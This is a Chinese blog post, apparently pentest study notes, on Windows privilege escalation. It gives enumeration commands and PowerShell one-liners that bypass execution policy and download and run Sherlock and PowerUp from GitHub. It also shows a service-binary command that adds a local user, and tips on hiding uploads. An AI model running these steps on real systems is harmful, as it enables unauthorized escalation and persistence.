{"title":"提权(一)-Windows系统","slug":"提权-一-Windows系统","date":"2018-09-24T07:41:06.000Z","updated":"2018-09-25T15:16:54.869Z","comments":true,"path":"api/articles/提权-一-Windows系统.json","photos":[],"link":"","excerpt":"前情提要这篇文章主要是为了总结一下这几天的成果。在此梳理以及记录，方便日后查看，复习。  ","covers":["https://bj.bcebos.com/v1/image-langke/img_hexo/Windows_zongjie.png","/img/systeminfo_.png","/img/WinSystemHelper_.png","/img/Sherlock_.png","/img/Privesc_.png","/img/Privesc___.png"],"content":"<h4 id=\"前情提要\"><a href=\"#前情提要\" class=\"headerlink\" title=\"前情提要\"></a>前情提要</h4><ul>\n<li>这篇文章主要是为了总结一下这几天的成果。</li>\n<li><p>在此梳理以及记录，方便日后查看，复习。  </p>\n<a id=\"more\"></a>\n<p><img src=\"https://bj.bcebos.com/v1/image-langke/img_hexo/Windows_zongjie.png\" alt=\"总结\"></p>\n<h2 id=\"Windows基础提权命令\"><a href=\"#Windows基础提权命令\" class=\"headerlink\" title=\"Windows基础提权命令\"></a>Windows基础提权命令</h2><blockquote>\n<h5 id=\"查看系统信息\"><a href=\"#查看系统信息\" class=\"headerlink\" title=\"查看系统信息\"></a>查看系统信息</h5><blockquote>\n<p><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>比如：<code>systeminfo | findstr /C:&quot;OS 名称&quot;</code><br><img src=\"/img/systeminfo_.png\" alt=\"演示\"></p>\n</blockquote>\n<h5 id=\"主机名\"><a href=\"#主机名\" class=\"headerlink\" title=\"主机名\"></a>主机名</h5><blockquote>\n<p><code>Hostname</code></p>\n</blockquote>\n<h5 id=\"环境变量\"><a href=\"#环境变量\" class=\"headerlink\" title=\"环境变量\"></a>环境变量</h5><blockquote>\n<p><strong>Set</strong>    查看所有环境变量<br><strong>path</strong>   查看常用软件环境变量</p>\n</blockquote>\n<h5 id=\"查看用户信息\"><a href=\"#查看用户信息\" class=\"headerlink\" title=\"查看用户信息\"></a>查看用户信息</h5><blockquote>\n<p><code>Net user</code><br><code>Net1 user</code></p>\n</blockquote>\n<h5 id=\"查看服务pid号\"><a href=\"#查看服务pid号\" class=\"headerlink\" title=\"查看服务pid号\"></a>查看服务pid号</h5><blockquote>\n<p><code>Tasklist /svc | find &quot;TermService&quot;</code><br><code>netstat -ano | find &quot;1488&quot;</code></p>\n</blockquote>\n<h5 id=\"查看系统名\"><a href=\"#查看系统名\" class=\"headerlink\" title=\"查看系统名\"></a>查看系统名</h5><blockquote>\n<p><code>wmic os get caption</code></p>\n</blockquote>\n<h5 id=\"查看补丁信息\"><a href=\"#查看补丁信息\" class=\"headerlink\" title=\"查看补丁信息\"></a>查看补丁信息</h5><blockquote>\n<p><code>wmic qfe get Description,HotFixID,InstalledOn | findstr /C:&quot;KB4013389&quot; /C:&quot;KB958644&quot;</code></p>\n</blockquote>\n<h5 id=\"查看当前安装程序\"><a href=\"#查看当前安装程序\" class=\"headerlink\" title=\"查看当前安装程序\"></a>查看当前安装程序</h5><blockquote>\n<p><code>wmic product get name,version</code></p>\n</blockquote>\n</blockquote>\n<p>这里只列出了提权过程中常用的部分语法，当然还有很多其它的语法，这里不一一列举。</p>\n<h2 id=\"windows提权分析工具使用\"><a href=\"#windows提权分析工具使用\" class=\"headerlink\" title=\"windows提权分析工具使用\"></a>windows提权分析工具使用</h2><p>由于每个系统对应的EXP都会有很多，渗透测试的时候，不可能把每个EXP都试一遍，所以我们要用脚本来帮助我们发现存在的可利用漏洞，这里介绍三款分析工具。</p>\n<h3 id=\"1-WinSystemHelper-master\"><a href=\"#1-WinSystemHelper-master\" class=\"headerlink\" title=\"1. WinSystemHelper-master\"></a>1. WinSystemHelper-master</h3><p><strong> 直接从GitHub下载相应的软件<a href=\"https://github.com/brianwrf/WinSystemHelper/archive/master.zip\" target=\"_blank\" rel=\"noopener\">WinSystemHelper</a>,也可以去看<a href=\"https://raw.githubusercontent.com/brianwrf/WinSystemHelper/master/README.md\" target=\"_blank\" rel=\"noopener\">详细说明</a> </strong><br>上传.bat和.txt文件到目标服务器，运行bat查看结果。<br>下面是本机运行后的效果图。之后选一个有眼缘的漏洞来进一步测试。<br><img src=\"/img/WinSystemHelper_.png\" alt=\"效果图\"></p>\n<h3 id=\"2-Sherlock\"><a href=\"#2-Sherlock\" class=\"headerlink\" title=\"2. Sherlock\"></a>2. Sherlock</h3><p>PowerShell脚本可快速查找缺少的本地权限提升漏洞的软件修补程序。<br>本地上传加载脚本</p>\n<blockquote>\n<p>首先调用powershell.exe<br><code>powershell.exe -exec bypass</code><br>加载脚本<br><code>Import-Module Sherlock.ps1</code><br>发现漏洞<br><code>Find-AllVulns</code><br><img src=\"/img/Sherlock_.png\" alt=\"演示图\"></p>\n</blockquote>\n</li>\n</ul>\n<p>远程加载脚本</p>\n<blockquote>\n<p><code>IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#39;)</code><br><code>Find-AllVulns</code></p>\n</blockquote>\n<h3 id=\"3-Privesc\"><a href=\"#3-Privesc\" class=\"headerlink\" title=\"3. Privesc\"></a>3. Privesc</h3><p>  PowerSploit - PowerShell后利用框架中的一个<br>本地上传执行</p>\n<blockquote>\n<p>首先调用powershell.exe<br><code>powershell.exe -exec bypass</code><br>加载脚本<br><code>Import-Module Privesc.psm1</code><br>查看导入的命令<br><code>Get-Command -Module Privesc</code><br>输出漏洞情况<br>Invoke-AllChecks<br><img src=\"/img/Privesc_.png\" alt=\"全部命令\" title=\"此模块的全部命令\"><br><img src=\"/img/Privesc__.png\" alt=\"漏洞情况\" title=\"系统存在的漏洞情况\"></p>\n</blockquote>\n<p>远程加载</p>\n<blockquote>\n<p><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;); Invoke-AllChecks&quot;</code><br><img src=\"/img/Privesc___.png\" alt=\"一行命令\"></p>\n</blockquote>\n<p>添加用户</p>\n<blockquote>\n<p><code>Install-ServiceBinary -ServiceName &#39;Apache_pn&#39; -UserName langke -Password 123456</code></p>\n</blockquote>\n<h4 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\" 写在后面的话 \"></a><strong> 写在后面的话 </strong></h4><ul>\n<li>上传文件一般会首选垃圾文件夹<code>C:\\Recovery</code>，其次是<code>C:\\Users\\All Users</code></li>\n<li>这里只讲了对Windows服务器可能存在漏洞的分析方法</li>\n<li>具体的漏洞利用方法这里就不讲了，因为太对了。无非都是相同的套路，创建用户-提升权限-ssh登陆</li>\n</ul>\n","categories":[],"tags":[{"name":"Equity","slug":"Equity","count":3,"path":"api/tags/Equity.json"}]}